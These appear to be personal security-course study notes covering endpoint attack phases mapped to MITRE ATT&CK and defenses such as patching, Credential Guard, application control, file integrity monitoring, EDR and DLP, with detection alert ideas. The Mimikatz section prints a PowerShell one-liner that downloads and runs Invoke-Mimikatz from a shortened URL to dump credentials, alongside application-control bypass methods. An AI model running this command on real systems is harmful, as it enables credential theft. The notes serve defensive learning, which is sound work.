## Endpoint Attack Tactics

### Endpoint Centricity 

Many important steps of an attack are endpoint-centric:
Exploitation
Code Execution
Persistence
Information Discovery: Accounts, files, privileges
Privilege escalation
Lateral movement
Data collection and preparation for exfiltration


Initial Explotation - Exploit luanched and success = running process/user
Service-Side Exploitation - Requires listning Port & FW ususally blocks this.
Client-Side Exploitation - Trick user into action open file
Post Explotation Tactics:
Execution, Persistence, Privilege Escalation, Defense Evasion,
Credential Access, Discovery, Lateral Movement, Collection, Command
and Control, Exfiltration

Using Mitre Att&ck Matrix to help set minium detection requirments. 

https://attack.mitre.org/

### Execution 

The next phase — establish code execution, install
• Typically, happens following successful exploitation
• Many times, spawns a command shell
- Could also be upgraded evil meterpreter-style command shell
- Used as foothold to download/run additional programs
- May also leverage programs or scripting languages
	-Ex: Using MSSQL or PowerShell prompt to launch programs
• Meant to be stopped with application control tools

### Persistence

To persist or not to persist?
Exploits might not work repeatedly
• Persistence detectable, more likely to be caught
Why persistence?
• Gives dependable repeated access over time
• Attacker otherwise loses control if user logs out/reboots
• Remediation attempts fail if not complete
• Antivirus may find and delete part of the trojan

### Discovery

Attackers must explore the environment to proceed:
• Account names and groups
• User permissions and privileges
• Folders and files on the local system and network
• Checking for running local and network services
• Other hosts on the network
• Applications installed and their configuration
Typically use built-in operating system commands

### Privilege Escalation 

• Once exploit lands, attacker gains a foothold
• Initial step often has no access, must escalate
• Start somewhere on these stairs
	- ..hopefully as low as possible
	- Attempt to escalate
• Defenses slow progression
• Privileges and permissions determine success

User <> Local Admin <> Multiple Host Admin <> Domain Admin

#### How does priv esc work

Hosts are designed to not allow this, so how is it possible?
By getting something with privilege to do a task for you
- Administrative users
- Services and other programs running as admin/root
- Operating system features and privileges
- Exploitation of software/kernel
Root of the problem is often
- File permissions
- Operating system privileges

#### Abusing Operating Systemn Priv

Many privilege escalation techniques rely on poor permissions:
• Hijacking admin startup items
• Modifying service executables
• Unquoted paths
• DLL search order hijacking
• Modifiable scheduled tasks
Automated with PowerUp privilege escalation script in
PowerSploit framework
• 100% PowerShell in-memory code, harder to detect!

https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

### Mimikatz

Sometimes its compiled from Source which is enough to throw off some AV suites; can also be custom compiled, plus it has been converted to different languages where compilation is not necessary, code runs entirely from memory. ASLR doesn't stop this. 

```powershell
powershell "IEX (New—Object Net.WebClient).DownloadString('http://is.gd/oeoFuI); Invoke-Mimikatz -DumpCreds"
```

http://is.gd/oeoFuI = -     
    https://raw.github.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1

```
sekurlsa::logonpasswords
```

### Lateral Movement

Attackers rarely reach the goal data from the first host
• Must pivot through the environment to gather access
• Requires both access to host and program to run
• Host access through exploit, legitimate credentials
• Code access via staging malware locally or on network
Many remote administration protocol choices:
• CLI - SSH, SMB w/PSExec, PowerShell remoting, WMI
• GUI - RDP, forwarding

### Collection


Once lateral movement succeeds, collection begins:
- Collection from local and remote file shares
- Screen and video capture
- Key logging
- Email theft
- Database export
- Staging data for exfil

Lateral Movement, Privilege Escalation, and collection

### Exfiltration

Data access is one goal, but data theft is more challenging
To successfully exfiltrate data, attackers:
- Must move gigabytes of data or more across network
- Often cannot send directly out from source
	- Must cleverly stage data elsewhere on network
- Must find an open port to send it out
- Must break up and obscure data to hide it
- Must send out slowly to not raise suspicion

Example

1-  Has C2 interaction
2- Use C2 to access data on DB bc direct access not allowed
3- Data is stolen, staged back on infected machine calling to C2 tunnel.
4- Data compressed, encrypted, broke into pieces, slowly exfiled to internet.

To find a way out attackers will crawl the firewall getting deny hits and eventually find a hole to exfil on. 

#Alert Create rules that look for Firewall Deny traffic using the most common protocols for transferring data. Group these rules and layer them so when multiple go off you can spot potential exfil attempts with higher and higher priority as each deny protocol occurs. 

### Exploit Stages 

Intrusions break into two main phases:
• Pre-Exploitation: Kill-chain stage 1-4
• Post-Exploitation: Kill-chain stage 5-7 (ATT&CK focused)
Some stages are network-centric, some are host-centric
Post-exploitation stage can be broken into tactics
• Execution, Lateral Movement, Discovery, Collection, Exfil, etc.
	- Tactics accomplished through many techniques listed in ATT&CK matrix
• Post-exploitation stage is when attacker is almost at their goal
• Many tactics for post-exploitation are best identified on the host

## Endpoint Defense in Depth

Exploitation: Network Scanning, Inventory, Patching, Anti-Exploitation
Installation: Hardening, AV, FIM, PAWS, App. Control
C2: Host firewall, HIDS/HIPS
Actions: Auditing, UBA, Encryption, Logging, DLP

### Network Scanning/Software Inventory

Preventing exploitation step 1: Know your software!
- We cannot protect what we don't know we have
- Types
	- Active scanning probes devices over the network
	- Passive scanning required where active scans cannot be used
Nmap is a good example scanner
- Scans for open ports
- Grabs banners for listening services
- Runs scripts
- Checks operating system versions

### Vuln MGMT

Authed and Unauthed to log software and hosts into a DB to query for remedations purposes. 

### Patching

Patching is the number one way to prevent exploitation
• CIS Top 20 Version 7
#2 = Know your software
#3 = Continuous patching
Not just network-based attacks
• Patching for operating systems
• Patching for server software
• Patching for client-side exploits as well


### Anti-Exploit

Stops exploits before they can infect and logs the attempts

Windows Tools:
EMET win 8.1/Server 2012 R2
Exploit Guard Win 10 EMET replacement

### Win Exploit Guard

Exploit Guard is the EMET replacement for Windows 10+
• Features dependent on Windows version
Exploit Protection: Successor to EMET's features set, applies granular
exploit protection to applications, logs violations
• Controlled Folder Access: Prevents ransomware encrypting your files by
defining "protected folders" only known apps can make changes to
• Network Protection: Blocks apps from connecting to malicious domains,
applies SmartScreen protection for all apps (Enterprise E3 required)
Attack Surface Reduction: Prevents common tactics used in malware
delivery via email. scripts. and office documents (Enterprise E5 required)

### Win Credential Guard Virtulization Sec

Prevents LSASS dumps, pass dumping, Pass-the-hash, Pass-the-ticket

### MSFT Defender App Guard Virtualization

Application guard uses hardware isolation to protect risky behaviors
- Uses Hyper-V containers to protect the system from malware
	- Compatible with desktops, laptops, BYOD, and personal devices
MS Edge Browser (Firefox/Chrome available with extension)
- Isolates loading untrusted websites (Windows 10 Pro)
Office
- Isolates Office applications inside virtual machine (Windows Enterprise)
- Files from the internet
- Risky locations (temp folders, etc.)
- Files protected by File Block (a way of disabling legacy document types)

### Host Firewalls

Prevent exploitation, lateral movement, C2, & exfil!
May have several "profiles" for device location
- Public — All ports closed
- Domain — Ports for remote management open, SMB open?
Like network firewall, should default inbound deny
• Outbound deny is a great idea where it can be defined — less common
Outstanding log source if heavily filtered, used tactically
• Visibility increase capabilities are incredible, but overwhelming if not
carefully implemented
• Turns every system into a security sensor

### Host vs Net FW

NET FW:
- Exploitation is not stopped
- Lateral movement is not prevented or visible
- C2/exfil seen only at network firewall

Net + Host FW:
- Exploitation is prevented and logged
- Lateral movement is prevented, attempt is logged
- C2/exfil stopped at the individual device level

#Alert Any attempts at SMB traffic between any PC's in this subnet should send an alert. Making lateral movement within the subnet all but impossible for an attacker.

### Antivirus

Look for new signature names and unique files in reputation DB's. 

### App Control

One of the best prevention and detection tools
• Many incidents involve executables at some point
• Stops unknown executables from running
May also work for scripts and installer packages
Does NOT stop files from being written
• Audit/Block mode: Detection capable regardless
Options for implementation: Name, path, signature, hash
• Perfect solution? No, but greatly reduces noise
• Windows AppLocker/WDAC1, macOS Gatekeeper2, Linux AppArmor3

Bypass - 

Is application control perfect? Unfortunately, no
Methods to bypass allowed programs list:
• Use malicious scripts/installer packages
• Living off the land: Use OS exe's for evil
• Code injection into a trusted process
• Name-based: Find what is on the list
• Path-based: Find a permissions error and overwrite exe
Signature/Hash-based: Use 6,610 years of CPU time 1 ; )

### File Integrity Monitoring

• Most often implemented through HIDS/HIPS
Detects installation phase of many malware types
• Periodically verify integrity of files/folders
File hash, size
Owner/Group
Permissions
Look for new files
• Enables rapid detection of unauthorized modifications
Modified system binaries, web shells, startup items, hosts file

#Alert FIM can monitor when file created on /var/www/html folder where site is hosted any new file write would alert the common backdoor file drop like my_backdoor.php 

### Caching Persistence

Most common ASEPs:
- Autorun items
- Malicious services
- Scheduled tasks
- Browser extensions
- Valid account credentials
Free sysinternals tool Autoruns enums many of them.

#Alert Turn on Object Access Auditing or FIM to immediately alert the SOC with a unique event any time a new reg key or file is added that deploys a persistence mechansim. 

### Privileged Access Workstations (PAWS)

- Giving user with high privilege a separate computer or virtual machine
for administrative duties
	- Must not use their administrative account from any normal machine ever
- One of the best ways to fight privilege escalation and lateral movement
- Provides a strong foundation of a secure device, a compromised device
- undermines all downstream items such as jump servers and accounts used

### Windows Permission and Privileges

Permissions:
- Prevent read/writing of restricted files and folders
- Stop attackers from modifying system binaries
- Very important for preventing privilege escalation

Privileges:
- Controls what users can do post-login
	-Load drivers, debug process, backup and restore files
- Also contribute to privilege escalation prevention

### EDR

A newer entry into the endpoint security market
• Like a flight data recorder for every endpoint
Processes, services, DLLS, files, registry keys, network use ...
Create a timeline of system events and changes
• Correlate data and integrate with other security solutions
• Greatly enhanced endpoint visibility
• Immediate response actions for remediation
• An analyst force multiplier
Also see "XDR" — new product category with network data too!

### DLP

• Focused on discovery, collection, and exfiltration tactics
• Goal: Prevent sensitive data leakage
	-Prevent risky/large file movement and report attempts
	-Highlight suspicious interactions, requires visibility and classification
• Use cases
	-Non-malicious insider: Prevent employee mistakes, enforce policy
	-Malicious insider: Detect employees trying to steal/destroy data
	-Malicious outsider: Protect data from attackers and espionage
• Prevents mistakes well, but may only slow a determined attacker

### UBA/UEBA

UEBA: User and Entity Behavior Analysis
- Goal: Find anomalous interactions
- Simplified concept of operations:
	- Tracks interactions between users, entities
	- Classifies with various statistics techniques
	- Automatically finds outliers
Key hypothesis: Anomalies are more likely to be evil
- Not always true, but a great way to eliminate noise
- May remove 99-999%, but on 1B events...still leaves a lot of noise
- Must layer on domain expertise to find true evil

### Audit Policies and Logging

Centralized logging plays an enormous role in attack detection!
• Event Logs: Audit trail of events that occurred
	- Tell us when a change was made to the system, who made it
	- Record when transactions occurred, data modified, etc.
• Audit Policies: Control what is and is not logged
	- Windows Audit Policy Syslog daemon config, Linux Auditing, Application and device logging settings
Analysts must understand how logging works and how to read
common logs

![Pasted image 20230401222436.png](../../../Media/Pasted%20image%2020230401222436.png)


---
How Windows Defender Credential Guard works | Microsoft Learn
https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-how-it-works

Microsoft Defender Application Guard (Windows 10 or Windows 11) | Microsoft Learn
https://learn.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-application-guard/md-app-guard-overview

Application Guard for Office for admins - Office 365 | Microsoft Learn
https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/install-app-guard?view=o365-worldwide

What is File Block? - Microsoft Support
https://support.microsoft.com/en-us/office/what-is-file-block-10d0e0ab-fecf-4605-befd-1e6563e7686d

Application Control for Windows | Microsoft Learn
https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/

Safely open apps on your Mac - Apple Support
https://support.apple.com/en-us/HT202491

AppArmor - Ubuntu Wiki
https://wiki.ubuntu.com/AppArmor

'First ever' SHA-1 hash collision calculated. All it took were five clever brains... and 6,610 years of processor time • The Register
https://www.theregister.com/2017/02/23/google_first_sha1_collision/

Autoruns for Windows - Sysinternals | Microsoft Learn
https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns

Why are privileged access devices important | Microsoft Learn
https://learn.microsoft.com/en-us/security/privileged-access-workstations/privileged-access-devices

PAW deployment guide | Microsoft Learn
https://learn.microsoft.com/en-us/archive/blogs/datacentersecurity/paw-deployment-guide

Data Loss Prevention - Devlin | SANS Institute
https://www.sans.org/white-papers/37152/

37152.pdf
https://sansorg.egnyte.com/dl/R0JecbDZ2K

Understand and use attack surface reduction (ASR) | Microsoft Learn
https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/overview-attack-surface-reduction?view=o365-worldwide

Microsoft Defender Application Guard (Windows 10 or Windows 11) | Microsoft Learn
https://learn.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-application-guard/md-app-guard-overview

Application Guard for Office for admins - Office 365 | Microsoft Learn
https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/install-app-guard?view=o365-worldwide

What is File Block? - Microsoft Support
https://support.microsoft.com/en-us/office/what-is-file-block-10d0e0ab-fecf-4605-befd-1e6563e7686d

The Dirty Pipe Vulnerability — The Dirty Pipe Vulnerability documentation
https://dirtypipe.cm4all.com/

gentilkiwi/mimikatz: A little tool to play with Windows security
https://github.com/gentilkiwi/mimikatz

OS Credential Dumping, Technique T1003 - Enterprise | MITRE ATT&CK®
https://attack.mitre.org/techniques/T1003/

MITRE ATT&CK®
https://attack.mitre.org/

xp_cmdshell (Transact-SQL) - SQL Server | Microsoft Learn
https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-2017

PowerSploit/Privesc at master · PowerShellMafia/PowerSploit
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

VirusTotal - URL - 168f075b46869731ad1fd06b2adc0e80209deb15b0d4dc058c46ca949d18d97c
https://www.virustotal.com/gui/url/168f075b46869731ad1fd06b2adc0e80209deb15b0d4dc058c46ca949d18d97c/details

is.gd - a URL shortener. Mmmm, tasty URLs!
https://is.gd/

